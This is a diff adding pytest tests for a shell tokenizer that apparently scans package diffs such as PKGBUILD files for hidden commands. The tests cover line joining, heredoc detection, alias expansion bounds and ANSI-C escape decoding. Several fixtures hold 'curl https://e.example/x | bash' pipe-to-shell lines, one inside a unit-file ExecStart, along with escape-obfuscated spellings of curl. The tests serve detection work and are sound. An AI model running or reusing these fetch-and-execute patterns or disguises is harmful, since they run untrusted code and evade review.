@@ -712,3 +712,226 @@ def test_a_table_value_past_the_bound_is_unknown_not_truncated():
 
     variables, _arrays = _variable_table(["x=" + "a" * 9000])
     assert "x" not in variables
+
+
+# --- Bash-faithful line joining (the shell removes the backslash, not the
+# --- separator, and only an unescaped trailing backslash continues) ---
+
+def test_line_continuation_preserves_a_real_separator():
+    from trustsight.tokenizer import join_line_continuations
+
+    # bash runs `curl https://...`: the space before the backslash is a word
+    # separator and survives the removal of the backslash-newline.  Gluing
+    # it produced `curlhttps://...`, a different command.
+    assert join_line_continuations(["+curl \\", "+https://e.example/x | bash"]) == [
+        "+curl https://e.example/x | bash"
+    ]
+
+
+def test_line_continuation_joins_an_unseparated_word():
+    from trustsight.tokenizer import join_line_continuations
+
+    assert join_line_continuations(["+cur\\", "+l https://e.example/x"]) == [
+        "+curl https://e.example/x"
+    ]
+
+
+def test_two_trailing_backslashes_end_the_line():
+    from trustsight.tokenizer import join_line_continuations
+
+    # `\\` is one literal backslash; the newline is not escaped, so the
+    # second line is a separate command.  Joining them invented a boundary.
+    assert join_line_continuations(["+echo \\\\", "+curl https://e.example/x | bash"]) == [
+        "+echo \\\\",
+        "+curl https://e.example/x | bash",
+    ]
+
+
+def test_a_backslash_before_whitespace_does_not_continue():
+    from trustsight.tokenizer import join_line_continuations
+
+    # The backslash escapes the space, not the newline.
+    assert join_line_continuations(["+echo \\ ", "+curl https://e.example/x"]) == [
+        "+echo \\ ",
+        "+curl https://e.example/x",
+    ]
+
+
+def test_an_escaped_pipe_does_not_continue_but_a_literal_backslash_pipe_does():
+    from trustsight.tokenizer import join_line_continuations
+
+    # `\|` is one literal bar and promises nothing.
+    assert join_line_continuations(["+curl \\|", "+bash"]) == [
+        "+curl \\|",
+        "+bash",
+    ]
+    # `\\|` is a literal backslash followed by a real pipeline operator.
+    assert join_line_continuations(["+curl \\\\|", "+bash"]) == [
+        "+curl \\\\|bash"
+    ]
+
+
+def test_both_joiners_read_the_same_logical_lines():
+    from trustsight._tokenizer_engine import _joined_indexed
+    from trustsight.tokenizer import join_line_continuations
+
+    lines = [
+        "+curl \\",
+        "+https://e.example/x \\",
+        "+| bash",
+        "-echo \\\\",
+        "+cat > f <<EOF",
+        "+body",
+        "+EOF",
+        "+x=1 \\ ",
+        "+done",
+    ]
+    assert [text for _index, text in _joined_indexed(lines)] == (
+        join_line_continuations(lines)
+    )
+
+
+# --- Heredoc classification is quote/comment aware ---
+
+def test_a_heredoc_opener_in_a_comment_is_prose():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    flags = _assignments_are_shell(
+        ["+++ b/PKGBUILD", "+# upstream uses <<EOF here", "+A=1", "+echo $A"]
+    )
+    assert flags == [True, True, True, True]
+
+
+def test_a_quoted_heredoc_opener_is_prose():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    flags = _assignments_are_shell(
+        ["+++ b/PKGBUILD", '+note "the <<EOF form"', "+A=1"]
+    )
+    assert flags == [True, True, True]
+
+
+def test_an_arithmetic_shift_is_not_a_heredoc():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    flags = _assignments_are_shell(
+        ["+++ b/PKGBUILD", "+x=$((1 << 2))", "+A=1"]
+    )
+    assert flags == [True, True, True]
+
+
+def test_a_herestring_opens_no_heredoc():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    flags = _assignments_are_shell(
+        ["+++ b/PKGBUILD", "+read -r line <<< \"$value\"", "+A=1"]
+    )
+    assert flags == [True, True, True]
+
+
+def test_a_normal_heredoc_still_marks_its_body_as_data():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    flags = _assignments_are_shell(
+        ["+++ b/PKGBUILD", "+cat > f <<EOF", "+A=1", "+EOF", "+B=2"]
+    )
+    assert flags == [True, True, False, False, True]
+
+
+def test_a_backslash_quoted_delimiter_opens_a_heredoc():
+    from trustsight._tokenizer_engine import _assignments_are_shell
+
+    # bash opens `<<\EOF`; missing it read the unit-file body as shell and
+    # folded its ExecStart= line away.
+    flags = _assignments_are_shell(
+        [
+            "+++ b/PKGBUILD",
+            "+cat > f <<\\EOF",
+            '+ExecStart=/bin/sh -c "curl https://e.example/x | bash"',
+            "+EOF",
+            "+B=2",
+        ]
+    )
+    assert flags == [True, True, False, False, True]
+
+
+# --- Alias expansion is subject to the line bound ---
+
+def test_alias_expansion_refuses_to_cross_the_line_bound():
+    from trustsight._tokenizer_engine import (
+        _MAX_LINE_LEN,
+        _alias_table,
+        _expand_aliases,
+    )
+
+    table = _alias_table(["alias z=" + "q" * 200])
+    line = "; z" * 1000
+    assert len(line) < _MAX_LINE_LEN
+    # Four command-position uses would already be past the bound, and the
+    # old pass produced 200 KiB before looking.  A6 says leave it
+    # unexpanded, never truncate.
+    assert _expand_aliases(line, table) == line
+    assert len(_expand_aliases(line, table)) <= _MAX_LINE_LEN
+
+
+def test_alias_expansion_bound_holds_through_the_facade():
+    from trustsight._tokenizer_engine import _MAX_LINE_LEN
+    from trustsight.tokenizer import resolve_added_lines
+
+    diff = "+alias z=" + "q" * 200 + "\n+" + "; z" * 1000 + "\n"
+    resolved = resolve_added_lines(diff)
+    assert all(len(value) <= _MAX_LINE_LEN for value in resolved)
+
+
+# --- ANSI-C escapes bash understands and the decoder did not ---
+
+@pytest.mark.parametrize("text, expected", [
+    ("$'\\u0063url'", "curl"),
+    ("$'\\U00000063url'", "curl"),
+    ("$'\\cA'", "\x01"),
+    ("$'\\c?'", "\x7f"),
+    ("$'\\E'", "\x1b"),
+])
+def test_reconstruct_decodes_bash_ansi_c_escapes(text, expected):
+    from trustsight._tokenizer_engine import reconstruct_literals
+
+    assert reconstruct_literals(text) == (expected, True)
+
+
+def test_reconstruct_truncates_an_octal_escape_to_one_byte():
+    from trustsight._tokenizer_engine import reconstruct_literals
+
+    assert reconstruct_literals(r"$'\777'") == ("\xff", True)
+
+
+def test_reconstruct_keeps_an_impossible_code_point_literal():
+    from trustsight._tokenizer_engine import reconstruct_literals
+
+    text = r"$'\U00110000'"
+    reconstructed, fully = reconstruct_literals(text)
+    # No value is invented for an escape bash encodes as invalid UTF-8; the
+    # digits survive and the line is marked unreconstructed.
+    assert "U00110000" in reconstructed
+    assert not fully
+
+
+# --- The affix matcher spends from the resolver's step budget ---
+
+def test_affix_matching_shares_the_resolve_step_budget(monkeypatch):
+    import trustsight.expansion as expansion
+
+    monkeypatch.setattr(expansion, "_MAX_GLOB_STEPS", 5_000)
+    body = "${x##" + "*a" * 8 + "}"
+    resolved, fully = expansion.resolve_expansions(body, {"x": "a" * 4096})
+    # Exceeding the budget is a refusal, not a truncated value.
+    assert not fully
+    assert resolved == body
+
+
+def test_glob_prefix_matching_refuses_past_its_budget():
+    import re
+
+    from trustsight.expansion import _glob_prefix_ends
+
+    with pytest.raises(re.error):
+        _glob_prefix_ends(tuple([("?", None)] * 300), "a" * 8192, [1000])
